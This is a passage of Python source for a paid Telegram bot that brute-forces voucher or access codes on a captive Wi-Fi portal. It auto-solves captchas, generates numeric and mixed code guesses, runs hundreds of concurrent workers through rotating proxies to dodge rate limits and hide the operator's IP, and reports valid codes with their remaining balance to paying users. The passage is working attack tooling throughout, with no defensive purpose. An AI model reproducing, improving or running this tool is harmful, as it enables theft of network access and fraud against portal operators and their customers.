        v_headers = {
            "content-type": "application/json",
            "user-agent": random.choice(USER_AGENTS),
            "Origin": PORTAL_BASE,
            "Referer": PORTAL_INDEX,
        }
        captcha_text = None
        verify_tried = False
        for _cap_try in range(7):
            try:
                text_try = await solve_captcha(session, session_id, headers)
                if not text_try:
                    continue
                v_payload = {"sessionId": session_id, "authCode": text_try}
                async with session.post(CAPTCHA_VERIFY_URL, json=v_payload, headers=v_headers,
                                        timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC)) as v_resp:
                    v_body = await v_resp.text()
                verify_tried = True
                ok = False
                try:
                    if json.loads(v_body).get("success") is True:
                        ok = True
                except Exception:
                    if '"success":true' in v_body.replace(" ", ""):
                        ok = True
                if ok:
                    captcha_text = text_try
                    break
            except asyncio.CancelledError:
                raise
            except Exception:
                continue
        if captcha_text is None:
            return "captcha" if verify_tried else "net"

        l_payload = {"accessCode": code, "sessionId": session_id,
                     "apiVersion": 1, "authCode": captcha_text}
        async with session.post(VOUCHER_URL, json=l_payload, headers=v_headers,
                                timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC)) as l_resp:
            body = await l_resp.text()

        if '"success":true' in body.replace(" ", ""):
            return "hit"
        low = body.lower()
        if "request limited" in low or "limited" in low:
            return "limit"
        return "bad"
    except (asyncio.TimeoutError, aiohttp.ClientError, OSError):
        return "net"
    except asyncio.CancelledError:
        raise
    except Exception:
        return "net"


# ========== CODE GENERATORS (HAUIGAKI style scan modes) ==========
digits_only = string.digits
letters_only = string.ascii_lowercase

MAX_CODES_PER_SID = 170


def digit_generator(length):
    return "".join(random.choice(digits_only) for _ in range(length))


def random_length_digit_generator(min_len, max_len):
    length = random.randint(min_len, max_len)
    return "".join(random.choice(digits_only) for _ in range(length))


def mix_generator(length, num_digits):
    positions = set(random.sample(range(length), num_digits))
    chars = []
    for i in range(length):
        if i in positions:
            chars.append(random.choice(digits_only))
        else:
            chars.append(random.choice(letters_only))
    return "".join(chars)


def lowercase_generator(length):
    return "".join(random.choice(letters_only) for _ in range(length))


def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        total = 10 ** length
        start = random.randrange(total)
        step = random.randrange(1, total, 2)
        while step % 5 == 0:
            step = random.randrange(1, total, 2)
        for i in range(total):
            yield str((start + i * step) % total).zfill(length)
        return
    if mode == "8":
        while True:
            yield digit_generator(8)
    if mode == "9":
        while True:
            yield digit_generator(9)
    if mode == "6to8":
        while True:
            yield random_length_digit_generator(6, 9)
    if mode == "mix6":
        while True:
            yield mix_generator(6, random.choice([1, 2]))
    if mode == "mix7":
        while True:
            yield mix_generator(7, random.choice([1, 2]))
    if mode == "a6":
        while True:
            yield lowercase_generator(6)
    raise ValueError(f"Unsupported scan mode: {mode}")


def format_progress(checked, total=None, speed=0, found=0, retries=0):
    header = f"🔺 <b>Scanning · Live</b>\n{DIVIDER}\n"
    if total is not None:
        bar_length = 12
        percent = min(100, (checked / total) * 100) if total else 0
        filled = min(bar_length, int(percent / 100 * bar_length))
        bar = "▰" * filled + "▱" * (bar_length - filled)
        progress = (f"💠 <b>{checked:,} / {total:,}</b>  ·  <b>{percent:.2f}%</b>\n"
                    f"<code>{bar}</code>\n")
    else:
        progress = f"💠 <b>{checked:,}</b>  ·  <b>Live continuous mode</b>\n"
    return (header + progress +
            f"⚡ <b>{speed:,.0f}/min</b>  ·  🎯 <b>Found {found}</b>\n"
            f"🔸 <b>Retries {retries}</b>\n\n"
            "Stop anytime with <code>/stop</code>.")

# ========== BOT INIT ==========
bot = AsyncTeleBot(BOT_TOKEN)

user_data = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
expired_messages = {}
expired_texts = {}
retry_counts = {}
scan_workers = {}
# Hit-group message edit throttle (Telegram 429 protection): the bot was muted
# for 11h after editing hit messages on every find. At most one edit per
# HIT_PUSH_MIN_INTERVAL seconds per scan per group; the first send is immediate.
_last_hit_push = {}
HIT_PUSH_MIN_INTERVAL = 5
MAX_SUCCESS_PER_SCAN = 140  # user spec 2026-10-11: cap success hits per scan; reaching it completes the scan

def _hit_push_allowed(group, key):
    now = time.monotonic()
    tkey = (group, key)
    last = _last_hit_push.get(tkey, 0)
    if now - last < HIT_PUSH_MIN_INTERVAL:
        return False
    _last_hit_push[tkey] = now
    return True
_start_time = time.monotonic()

WORKERS = 700  # RUIJIE style worker pool (adjustable via /setconcurrency)
EXP_SETTING_FILE = "exp_setting.json"


def _load_show_expired():
    """Persisted /exp toggle; default OFF until the admin turns it on."""
    try:
        with open(EXP_SETTING_FILE) as f:
            return bool(json.load(f).get("show_expired", False))
    except Exception:
        return False


def _save_show_expired(value):
    try:
        with open(EXP_SETTING_FILE, "w") as f:
            json.dump({"show_expired": bool(value)}, f)
    except OSError:
        pass


SHOW_EXPIRED = _load_show_expired()  # Admin toggle via /exp on|off — persisted in exp_setting.json


def scan_key(chat_id, scan_id):
    return (int(chat_id), str(scan_id))


def scan_is_active(chat_id, scan_id):
    current = scan_tasks.get(chat_id)
    if not current or current.get("scan_id") != scan_id or current.get("stop"):
        return False
    task = current.get("task")
    return task is None or not task.done()


def clear_scan_state(chat_id, scan_id):
    key = scan_key(chat_id, scan_id)
    for state in (success_messages, success_texts, limited_messages,
                  limited_texts, expired_messages, expired_texts,
                  retry_counts, scan_workers):
        state.pop(key, None)
    for tkey in [k for k in _last_hit_push if k[1] == key]:
        _last_hit_push.pop(tkey, None)
    current = scan_tasks.get(chat_id)
    if current and current.get("scan_id") == scan_id:
        scan_tasks.pop(chat_id, None)


# ========== HYBRID SCAN ENGINE (RUIJIE workers + HAUIGAKI modes/UI) ==========
async def hybrid_worker(wid, chat_id, scan_id, session_url, code_iter, iter_lock, headers):
    pm = get_proxy_manager()
    key = scan_key(chat_id, scan_id)
    while True:
        task_state = scan_tasks.get(chat_id)
        if not task_state or task_state.get("scan_id") != scan_id or task_state.get("stop"):
            return
        proxy = await pm.get_next()
        if not proxy:
            # No proxies left — never fall back to direct IP; wait for reload/stop.
            await asyncio.sleep(2)
            continue
        connector = create_connector_for_proxy(proxy)
        timeout = aiohttp.ClientTimeout(total=TIMEOUT_SEC)
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                sid = await get_sid_from_gateway(session, session_url)
                if not sid:
                    task_state["net"] = task_state.get("net", 0) + 1
                    await pm.mark_bad(proxy)
                    await asyncio.sleep(0.05)
                    continue
                await pm.mark_good(proxy)
                for _ in range(MAX_CODES_PER_SID):
                    task_state = scan_tasks.get(chat_id)
                    if not task_state or task_state.get("scan_id") != scan_id or task_state.get("stop"):
                        return
                    async with iter_lock:
                        try:
                            code = next(code_iter)
                        except StopIteration:
                            task_state["exhausted"] = True
                            return
                    # Same-code retry (user spec 2026-10-09): up to 3 attempts
                    # while the result is not definitive (net/captcha/limit);
                    # hit/bad are final. The code is counted as checked once.
                    result = await check_single_access_code(session, code, sid, headers, proxy)
                    _code_tries = 1
                    while result in ("net", "captcha", "limit") and _code_tries < 3:
                        if result == "limit":
                            await asyncio.sleep(1)
                        result = await check_single_access_code(session, code, sid, headers, proxy)
                        _code_tries += 1
                    task_state["checked"] = task_state.get("checked", 0) + 1
                    if result == "hit":
                        plan, time_str = await fetch_balance(session, sid)
                        if time_str == "Expired":
                            # Expired voucher — shown in its own group only when enabled.
                            task_state["expired"] = task_state.get("expired", 0) + 1
                            db_link_code_session(code, session_url, chat_id)
                            if SHOW_EXPIRED:
                                expired_texts.setdefault(key, []).append(
                                    f"💳 <code>{escape(str(code))}</code>\n   📋 {escape(str(plan))} | ⏳ Expired"
                                )
                                await push_expired_message(chat_id, scan_id)
                            continue
                        if len(success_texts.get(key, [])) >= MAX_SUCCESS_PER_SCAN:
                            task_state["hit_cap"] = True
                            continue
                        code_list = success_texts.setdefault(key, [])
                        code_num = len(code_list) + 1
                        code_list.append(
                            f"{code_num}•💳 <code>{escape(str(code))}</code>📝 {escape(str(plan))} | 🔸 {escape(str(time_str))}"
                        )
                        uid = str(chat_id)
                        existing = db_get_results(uid)
                        existing.append(code)
                        db_save_results(uid, existing)
                        db_link_code_session(code, session_url, uid)
                        await push_success_message(chat_id, scan_id)
                        if len(code_list) >= MAX_SUCCESS_PER_SCAN:
                            task_state["hit_cap"] = True
                    elif result == "limit":
                        limited_texts.setdefault(key, []).append(
                            f"⚠️ <code>{escape(str(code))}</code>"
                        )
                        retry_counts[key] = retry_counts.get(key, 0) + 1
                        await push_limited_message(chat_id, scan_id)
                        break
                    elif result == "net":
                        task_state["net"] = task_state.get("net", 0) + 1
                        await pm.mark_bad(proxy)
                        break
                    else:
                        # hit / limit / bad / captcha all got real portal responses:
                        # the proxy itself is working.
                        await pm.mark_good(proxy)
        except asyncio.CancelledError:
            raise
        except Exception:
            task_state = scan_tasks.get(chat_id)
            if task_state:
                task_state["net"] = task_state.get("net", 0) + 1
            await pm.mark_bad(proxy)
        await asyncio.sleep(0.005)


async def push_success_message(chat_id, scan_id):
    key = scan_key(chat_id, scan_id)
    if not scan_is_active(chat_id, scan_id):
        return
    if key in success_messages and not _hit_push_allowed("success", key):
        return  # throttled: first send immediate, edits max 1/5s
    code_line = "\n\n".join(success_texts.get(key, []))
    result_text = premium_emoji(f"🔥 <b>Success Codes: {len(success_texts.get(key, []))}</b>\n\n{code_line}")
    try:
        if key not in success_messages:
            sent = await bot.send_message(chat_id=chat_id, text=result_text, parse_mode="HTML")
            success_messages[key] = sent.message_id
        else:
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=success_messages[key],
                                            text=result_text, parse_mode="HTML")
            except Exception:
                sent = await bot.send_message(chat_id=chat_id, text=result_text, parse_mode="HTML")
                success_messages[key] = sent.message_id
    except Exception as e:
        print(f"Success Message Error: {e}")


async def push_limited_message(chat_id, scan_id):
    key = scan_key(chat_id, scan_id)
    if not scan_is_active(chat_id, scan_id):
        return
    if key in limited_messages and not _hit_push_allowed("limited", key):
        return  # throttled: first send immediate, edits max 1/5s
    limited_line = "\n\n".join(limited_texts.get(key, []))
    result_text = premium_emoji(f"⚠️ <b>Limited Codes: {len(limited_texts.get(key, []))}</b>\n\n{limited_line}")
    try:
        if key not in limited_messages:
            sent = await bot.send_message(chat_id=chat_id, text=result_text, parse_mode="HTML")
            limited_messages[key] = sent.message_id
        else:
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=limited_messages[key],
                                            text=result_text, parse_mode="HTML")
            except Exception:
                sent = await bot.send_message(chat_id=chat_id, text=result_text, parse_mode="HTML")
                limited_messages[key] = sent.message_id
    except Exception as e:
        print(f"Limited Message Error: {e}")


async def push_expired_message(chat_id, scan_id):
    key = scan_key(chat_id, scan_id)
    if not scan_is_active(chat_id, scan_id):
        return
    if key in expired_messages and not _hit_push_allowed("expired", key):
        return  # throttled: first send immediate, edits max 1/5s
    code_line = "\n\n".join(expired_texts.get(key, []))
    result_text = premium_emoji(f"⏳ <b>Expired Codes: {len(expired_texts.get(key, []))}</b>\n\n{code_line}")
    try:
        if key not in expired_messages:
            sent = await bot.send_message(chat_id=chat_id, text=result_text, parse_mode="HTML")
            expired_messages[key] = sent.message_id
        else:
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=expired_messages[key],
                                            text=result_text, parse_mode="HTML")
            except Exception:
                sent = await bot.send_message(chat_id=chat_id, text=result_text, parse_mode="HTML")
                expired_messages[key] = sent.message_id
    except Exception as e:
        print(f"Expired Message Error: {e}")


async def run_hybrid_scan(mode, chat_id, session_url, scan_id, progress_msg):
    key = scan_key(chat_id, scan_id)
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, premium_emoji(str(e)), parse_mode="HTML")
        return

    total = 10 ** int(mode) if mode in ["6", "7"] else None
    scan_start = time.monotonic()
    scan_tasks[chat_id]["start_time"] = scan_start
    scan_tasks[chat_id]["checked"] = 0
    iter_lock = asyncio.Lock()
    headers = build_headers()

    workers = set()
    scan_workers[key] = workers
    for wid in range(WORKERS):
        workers.add(asyncio.create_task(
            hybrid_worker(wid, chat_id, scan_id, session_url, code_iter, iter_lock, headers)))

    last_update = 0.0

    async def update_progress(force=False):
        nonlocal last_update
        now = time.monotonic()
        if not force and now - last_update < 2.0:
            return
        last_update = now
        data = scan_tasks.get(chat_id)
        if not data:
            return
        checked = data.get("checked", 0)
        elapsed = now - scan_start
        speed = (checked / elapsed * 60) if elapsed > 0 else 0
        found = len(success_texts.get(key, []))
        retries = retry_counts.get(key, 0)
        data["speed"] = speed
        text = format_progress(checked, total, speed, found, retries)
        if data.get("paused_for_proxies"):
            text += "\n⏳ <b>Waiting for proxies to recover…</b>"
        try:
            await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id,
                                        text=premium_emoji(text), parse_mode="HTML")
        except Exception:
            pass

    try:
        # Poll loop: reaps finished workers every second and updates the
        # progress display independently (workers are long-lived, so we
        # must NOT wait on them to trigger display updates).
        while True:
            await asyncio.sleep(1)
            for w in [w for w in workers if w.done()]:
                workers.discard(w)
                try:
                    w.result()
                except asyncio.CancelledError:
                    pass
                except Exception as e:
                    print(f"[worker] {type(e).__name__}: {e}")
            data = scan_tasks.get(chat_id)
            if not data or data.get("stop") or data.get("exhausted") or data.get("hit_cap") or not workers:
                break
            pm = get_proxy_manager()
            if not pm.has_proxies():
                # Proxies file is truly empty — stop instead of falling back to direct IP.
                data["stop"] = True
                data["proxies_dead"] = True
                break
            if pm.get_active_count() == 0:
                # All proxies are cooling down — pause, don't stop; they rejoin
                # rotation automatically after the cooldown.
                data["paused_for_proxies"] = True
            else:
                data.pop("paused_for_proxies", None)
            await update_progress()
        if (scan_tasks.get(chat_id) or {}).get("hit_cap"):
            _last_hit_push.pop(("success", key), None)
            await push_success_message(chat_id, scan_id)
        await update_progress(force=True)

        data = dict(scan_tasks.get(chat_id) or {})
        if progress_msg and (scan_is_active(chat_id, scan_id) or data.get("proxies_dead")):
            final_found = len(success_texts.get(key, []))
            final_retries = retry_counts.get(key, 0)
            expired = data.get("expired", 0)
            expired_label = "Expired" if SHOW_EXPIRED else "Expired skipped"
            expired_line = f"⏳ <b>{expired_label}</b>  {expired}\n" if expired else ""
            if data.get("proxies_dead"):
                finish_text = (f"⚠️ <b>Scan stopped — no proxies left</b>\n{DIVIDER}\n"
                               f"📊 <b>Checked</b>   {data.get('checked', 0):,}\n"
                               f"✅ <b>Found</b>     {final_found}\n"
                               f"{expired_line}\n"
                               "Reply to a proxy list message with <code>/proxy</code>\n"
                               "to add new proxies, then scan again.")
            else:
                finish_text = (f"🎆 <b>Scan complete</b>\n{DIVIDER}\n"
                               f"📊 <b>Checked</b>   {data.get('checked', 0):,}\n"
                               f"✅ <b>Found</b>     {final_found}\n"
                               f"🔁 <b>Retries</b>   {final_retries}\n"
                               f"{expired_line}\n"
                               "View your results with <code>/result</code>.")
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id,
                                            text=premium_emoji(finish_text), parse_mode="HTML")
            except Exception:
                pass
    finally:
        for w in list(scan_workers.get(key, set())):
            if not w.done():
                w.cancel()
        pending = scan_workers.get(key, set())
        if pending:
            await asyncio.gather(*pending, return_exceptions=True)
        clear_scan_state(chat_id, scan_id)


async def begin_scan(mode, chat_id, source_message, username=None):
    if not get_proxy_manager().has_proxies():
        await bot.send_message(chat_id, premium_emoji(
            "⚠️ <b>No proxies available — scan blocked.</b>\n\n"
            "Reply to a message containing a proxy list with <code>/proxy</code>\n"
            "to add proxies first. Direct IP is never used."),
            parse_mode="HTML")
        return
    # Scan-start gate: verify the session URL can actually open a portal
    # session before launching workers. Bad URL -> "Wrong URL", no scan.
    testing_msg = await bot.send_message(chat_id, premium_emoji(
        "🔍 <b>Testing session URL...</b>"), parse_mode="HTML")
    url_ok = await can_open_portal_session(user_data[chat_id]['session_url'])
    try:
        await bot.delete_message(chat_id, testing_msg.message_id)
    except Exception:
        pass
    if not url_ok:
        await bot.send_message(chat_id, premium_emoji(
            "❌ <b>Wrong URL!</b>\n\nCouldn't open a portal session with this URL through proxies.\n"
            "The portal may be rate-limiting or the URL expired.\n"
            "Set a fresh URL with <code>/input</code> and try again."),
            parse_mode="HTML")
        return
    progress_msg = await bot.send_message(chat_id, premium_emoji(
        f"🎯 <b>Scan is starting</b>\n{DIVIDER}\nMode: <code>{mode}</code>\nWorkers: <code>{WORKERS}</code>\nPreparing progress…"),
        parse_mode="HTML")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(run_hybrid_scan(
        mode, chat_id, user_data[chat_id]['session_url'], scan_id, progress_msg))
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id,
                           "mode": mode, "checked": 0, "username": username}
    if username:
        db_set_username(chat_id, username)


# ========== WEB SERVER ==========
async def handle(request):
    return web.Response(text="HAUIGAKI hybrid bot process is running")


async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8100))
    try:
        site = web.TCPSite(runner, '127.0.0.1', port)
        await site.start()
        print(f"Web server started on 127.0.0.1:{port}")
        await asyncio.Future()
    finally:
        await runner.cleanup()

# ========== MENU (HAUIGAKI style) ==========
def menu_keyboard(section, user_id):
    menu = types.InlineKeyboardMarkup(row_width=2)
    icons = {"help": "📝", "profile": "💠", "modes": "🎯", "results": "💎",
             "admin": "📊", "home": "🌐", "proxy": "🌐"}

    def button(label, page):
        return types.InlineKeyboardButton(
            label, callback_data=f"ui:{page}:{user_id}",
            icon_custom_emoji_id=PREMIUM_EMOJI_IDS[icons[page]],
        )

    def mode_button(mode, label, icon):
        return types.InlineKeyboardButton(
            label, callback_data=f"scan:{mode}:{user_id}",
            icon_custom_emoji_id=PREMIUM_EMOJI_IDS[icon],
        )

    if section == "home":
        menu.row(button("Account", "profile"), button("Commands", "help"))
        menu.row(button("Scan modes", "modes"), button("Results", "results"))
        if is_admin(user_id):
            menu.row(button("Admin overview", "admin"), button("Proxy health", "proxy"))
        menu.row(types.InlineKeyboardButton(
            "Contact admin", url=f"https://t.me/{ADMIN_CONTACT.lstrip('@')}",
            icon_custom_emoji_id=PREMIUM_EMOJI_IDS["💳"],
        ))
    else:
        if section == "help":
            menu.row(button("Scan modes", "modes"), button("My account", "profile"))
        if section == "admin":
            menu.row(button("Proxy health", "proxy"), button("Commands", "help"))
        if section == "proxy":
            menu.row(button("Admin overview", "admin"))
        if section == "modes":
            menu.row(mode_button("6", "6 digits", "🎯"), mode_button("7", "7 digits", "🎯"))
            menu.row(mode_button("8", "8 digits ∞", "🔥"), mode_button("9", "9 digits ∞", "🔥"))
            menu.row(mode_button("6to8", "6–9 digits ∞", "🚀"))
            menu.row(mode_button("mix6", "Mix 6 ∞", "💎"), mode_button("mix7", "Mix 7 ∞", "💎"))
            menu.row(mode_button("a6", "a6 · 6 lowercase ∞", "📝"))
        menu.row(button("Back to home", "home"))
    return menu


def proxy_state_text():
    pm = get_proxy_manager()
    total, bad = pm.stats()
    active = total - bad
    if total == 0:
        return "Direct (no proxies loaded)"
    return f"Proxy file · {active} active / {bad} cooling"


def render_home(user_id):
    user = db_get_user(str(user_id))
    key_data = db_get_key(user["key"]) if user else None
    active = check_access(user_id)
    if is_admin(user_id):
        access = "Admin access"
        plan = "Owner"
    elif active and key_data:
        access = "Active"
        plan = escape(str(key_data["plan"]))
    else:
        access = "Key required / expired"
        plan = "Not active"
    setup = ("<code>/input YOUR_SESSION_URL</code>\n"
             "<code>/scan 6</code>  ·  choose a mode below") if active else (
             "<code>/key YOUR_KEY</code>\n"
             "Need a key? Contact the admin below.")
    text = (f"💎 <b>{BOT_NAME}</b>  <i>Dashboard</i>\n"
            f"{DIVIDER}\n"
            f"💠 <b>Account</b>  {access} · {plan}\n"
            f"🌐 <b>Network</b>  {proxy_state_text()}\n"
            f"⚡ <b>Workers</b>  {WORKERS}\n"
            f"{DIVIDER}\n"
            f"📝 <b>Get started</b>\n{setup}\n\n"
            "Choose a section below for details.\n"
            f"{DIVIDER}\n"
            f"💳 <b>Contact admin</b>  <a href=\"https://t.me/{ADMIN_CONTACT.lstrip('@')}\">"
            f"{escape(ADMIN_CONTACT)}</a>")
    return text


def render_help(user_id):
    text = (f"📝 <b>Commands &amp; shortcuts</b>\n{DIVIDER}\n"
            "<b>Account</b>\n"
            "<code>/start</code>  Dashboard\n"
            "<code>/key YOUR_KEY</code>  Activate a key\n"
            "<code>/id</code>  Your Telegram ID\n\n"
            "<b>Scanning</b>\n"
            "<code>/input URL</code>  Set session URL\n"
            "<code>/scan MODE</code>  Start a scan\n"
            "<code>/scan a6</code>  6 lowercase letters (a–z)\n"
            "<code>/stop</code>  Stop your scan\n"
            "<code>/result</code>  Saved results\n"
            "<code>/recheck</code>  Recheck saved codes")
    if is_admin(user_id):
        text += ("\n\n<b>Admin tools</b>\n"
                 "<code>/status</code>  Bot overview\n"
                 "<code>/genkey</code> · <code>/delkey</code> · <code>/listkeys</code> · <code>/delexp</code>\n"
                 "<code>/proxy</code> · <code>/addproxy</code> · <code>/chkproxy</code> · <code>/rmproxy</code>\n"
                 "<code>/setconcurrency</code> · <code>/exp</code> · <code>/setpool</code>\n"
                 "<code>/stats</code> · <code>/stopall</code> · <code>/bo</code>\n"
                 "<code>/stop USER_ID</code>  Stop a user's scan")
    text += "\n\n🎯 Tap <b>Scan modes</b> for examples."
    return text


def render_modes(user_id):
    ready = bool(user_data.get(user_id, {}).get("session_url"))
    next_step = ("Tap a mode below to begin. Use <code>/stop</code> at any time."
                 if ready else "First send <code>/input YOUR_SESSION_URL</code>.")
    return (f"🎯 <b>Choose a scan mode</b>\n{DIVIDER}\n"
            f"<b>Session</b>  {'Ready' if ready else 'Not set'}\n"
            "6 / 7: fixed length  ·  ∞: continuous mode\n"
            "a6: 6 lowercase letters (a–z)\n\n"
            f"{next_step}")


def render_session_saved(url):
    preview = url if len(url) <= 104 else f"{url[:79]}…{url[-21:]}"
    host = urlsplit(url).hostname or "Unknown host"
    return (f"🌐 <b>Session saved</b>\n{DIVIDER}\n"
            f"<b>Host</b>  <code>{escape(host)}</code>\n"
            f"<b>URL</b>   <code>{escape(preview)}</code>\n\n"
            "🎯 <b>Ready to choose a scan mode.</b>\n"
            "Tap a button below, or change the URL with <code>/input</code>.")


def render_profile(user_id):
    user = db_get_user(str(user_id))
    key_data = db_get_key(user["key"]) if user else None
    if is_admin(user_id):
        detail = "<b>Role</b>       Admin\n<b>Access</b>   Active"
    elif key_data:
        detail = (f"<b>Plan</b>       {escape(str(key_data['plan']))}\n"
                  f"<b>Access</b>   {'Active' if check_key_expiration(key_data['expires_at']) else 'Expired'}\n"
                  f"<b>Expires</b>  {escape(display_expiry(key_data['expires_at']))}")
    else:
        detail = ("<b>Access</b>   No active key\n"
                  "Activate with <code>/key YOUR_KEY</code>.")
    return (f"💠 <b>My account</b>\n{DIVIDER}\n"
            f"<b>Telegram ID</b>  <code>{user_id}</code>\n"
            f"{detail}\n\n💳 Key support: {escape(ADMIN_CONTACT)}")


def render_results(user_id):
    results = db_get_results(str(user_id))
    if not results:
        return (f"📝 <b>Saved results</b>\n{DIVIDER}\n"
                "Nothing saved yet.\n\nUse <code>/result</code> to check again later.")
    preview = "\n".join(f"  <code>{escape(str(code))}</code>" for code in results[-8:])
    return (f"📝 <b>Saved results</b>\n{DIVIDER}\n"
            f"<b>Total:</b> {len(results)}\n\n{preview}\n\n"
            "Use <code>/result</code> to view the full list.")


def render_admin(user_id):
    if not is_admin(user_id):
        return "❌ Admin access only."
    active = sum(1 for data in scan_tasks.values() if data.get("task") and not data["task"].done())
    uptime = int(time.monotonic() - _start_time)
    return (f"📊 <b>Operations center</b>\n{DIVIDER}\n"
            f"<b>Uptime</b>         {uptime // 3600}h {(uptime % 3600) // 60}m\n"
            f"<b>Users</b>          {len(db_get_all_users())}\n"
            f"<b>Keys</b>           {len(db_get_all_keys())}\n"
            f"<b>Active scans</b>   {active}\n"
            f"<b>Connection</b>    {proxy_state_text()}\n\n"
            "<code>/status</code> Full status · <code>/stats</code> Live scans\n"
            "<code>/help</code> All admin commands")


def render_proxy(user_id):
    if not is_admin(user_id):
        return "❌ Admin access only."
    pm = get_proxy_manager()
    total, bad = pm.stats()
    active = total - bad
    return (f"🌐 <b>Proxy health</b>\n{DIVIDER}\n"
            f"<b>Source</b>      proxies.txt (RUIJIE style)\n"
            f"<b>Total</b>       {total}\n"
            f"<b>Active</b>      {active}\n"
            f"<b>Cooling</b>     {bad}\n\n"
            "📥 <b>Reply</b> to a proxy list message with <code>/proxy</code>\n"
            "to import (<code>ip:port:user:pass</code> or <code>http://ip:port</code>).\n"
            "<code>/proxy reload</code> reloads proxies.txt.\n"
            "⚠️ No proxies = scan blocked (no direct IP).")


MENU_PAGES = {"home": render_home, "help": render_help, "modes": render_modes,
              "profile": render_profile, "results": render_results,
              "admin": render_admin, "proxy": render_proxy}


@bot.callback_query_handler(func=lambda call: bool(call.data and call.data.startswith("ui:")))
async def menu_callback(call):
    try:
        _, page, owner = call.data.split(":", 2)
        if page not in MENU_PAGES or not owner.isdigit():
            await bot.answer_callback_query(call.id, "Unknown menu.", show_alert=True)
            return
        if int(owner) != call.from_user.id:
            await bot.answer_callback_query(call.id, "Open /start in your own chat.", show_alert=True)
            return
        if page in ("admin", "proxy") and not is_admin(owner):
            await bot.answer_callback_query(call.id, "Admin access only.", show_alert=True)
            return
        await bot.answer_callback_query(call.id)
        await bot.edit_message_text(
            premium_emoji(MENU_PAGES[page](int(owner))),
            chat_id=call.message.chat.id, message_id=call.message.message_id,
            parse_mode="HTML", reply_markup=menu_keyboard(page, int(owner)),
        )
    except Exception as exc:
        if "message is not modified" not in str(exc).lower():
            print(f"[menu] {type(exc).__name__}: {exc}")


@bot.callback_query_handler(func=lambda call: bool(call.data and call.data.startswith("scan:")))
async def scan_mode_callback(call):
    try:
        _, mode, owner = call.data.split(":", 2)
        if mode not in SCAN_MODES or not owner.isdigit() or int(owner) != call.from_user.id:
            await bot.answer_callback_query(call.id, "This button is not available for your account.", show_alert=True)
            return
        chat_id = call.message.chat.id
        if not check_access(chat_id):
            await bot.answer_callback_query(call.id, "Activate a key before scanning.", show_alert=True)
            return
        if not user_data.get(chat_id, {}).get("session_url"):
            await bot.answer_callback_query(call.id, "Set a session URL with /input first.", show_alert=True)
            return
        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
            await bot.answer_callback_query(call.id, "A scan is already running. Use /stop first.", show_alert=True)
            return
        await bot.answer_callback_query(call.id, "Starting scan…")
        await begin_scan(mode, chat_id, call.message, username=call.from_user.username)
    except Exception as exc:
        print(f"[scan-button] {type(exc).__name__}: {exc}")


@bot.message_handler(commands=['start'])
async def start(message):
    user_id = message.from_user.id
    db_set_username(user_id, message.from_user.username)
    await bot.reply_to(message, premium_emoji(render_home(user_id)),
                       parse_mode="HTML", reply_markup=menu_keyboard("home", user_id))


@bot.message_handler(commands=['help'])
async def help_command(message):
    user_id = message.from_user.id
    await bot.reply_to(message, premium_emoji(render_help(user_id)),
                       parse_mode="HTML", reply_markup=menu_keyboard("help", user_id))


@bot.message_handler(commands=['id'])
async def get_id(message):
    user_id = message.from_user.id
    first_name = escape(message.from_user.first_name or "No name")
    username = escape(message.from_user.username or "Not set")
    text = (f"💠 <b>Telegram identity</b>\n{DIVIDER}\n"
            f"<b>Name</b>       {first_name}\n"
            f"<b>Username</b>   @{username}\n"
            f"<b>User ID</b>    <code>{user_id}</code>")
    await bot.reply_to(message, premium_emoji(text), parse_mode="HTML")


@bot.message_handler(commands=['key'])
async def handle_key(message):
    user_id = str(message.chat.id)

    existing = db_get_user(user_id)
    if existing:
        key_data = db_get_key(existing["key"])
        if key_data and check_key_expiration(key_data["expires_at"]):
            user_data[message.chat.id] = {}
            text = (f"✅ <b>Your key is active</b>\n{DIVIDER}\n"
                    f"<b>Plan</b>      {escape(str(key_data['plan']))}\n"
                    f"<b>Expires</b>   {escape(display_expiry(key_data['expires_at']))}\n\n"
                    "📝 Next: <code>/input YOUR_SESSION_URL</code>")
            await bot.reply_to(message, premium_emoji(text), parse_mode="HTML",
                               reply_markup=menu_keyboard("home", message.from_user.id))
            return

    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, premium_emoji("❌ Please provide a key: /key YOUR_KEY"), parse_mode="HTML")
        return

    key = args[1].strip()
    key_data = db_get_key(key)

    if not key_data:
        await bot.reply_to(message, premium_emoji(f"❌ Invalid key. Buy one from {ADMIN_CONTACT}"), parse_mode="HTML")
        return

    if key_data["user_id"]:
        if str(key_data["user_id"]) != user_id:
            await bot.reply_to(message, premium_emoji(f"❌ This key is not for your account.\n💳 Buy your own key: {ADMIN_CONTACT}"), parse_mode="HTML")
            return
    else:
        with get_db_cursor() as c:
            c.execute("UPDATE keys SET user_id = ? WHERE key = ?", (user_id, key))

    if not check_key_expiration(key_data["expires_at"]):
        await bot.reply_to(message, premium_emoji(f"❌ Key has expired. Buy new one from {ADMIN_CONTACT}"), parse_mode="HTML")
        return

    db_add_user(user_id, key)
    db_set_username(message.chat.id, message.from_user.username)
    user_data[message.chat.id] = {}

    text = (f"🎆 <b>Key activated!</b>\n{DIVIDER}\n"
            f"<b>Plan</b>      {escape(str(key_data['plan']))}\n"
            f"<b>Expires</b>   {escape(display_expiry(key_data['expires_at']))}\n\n"
            "📝 Next: <code>/input YOUR_SESSION_URL</code>")
    await bot.reply_to(message, premium_emoji(text), parse_mode="HTML",
                       reply_markup=menu_keyboard("home", message.from_user.id))


@bot.message_handler(commands=['input'])
async def handle_input(message):
    user_id = message.chat.id
    if not check_access(user_id):
        text = f"❌ <b>Your key has expired or not activated!</b>\n\n💳 Buy key: {ADMIN_CONTACT}"
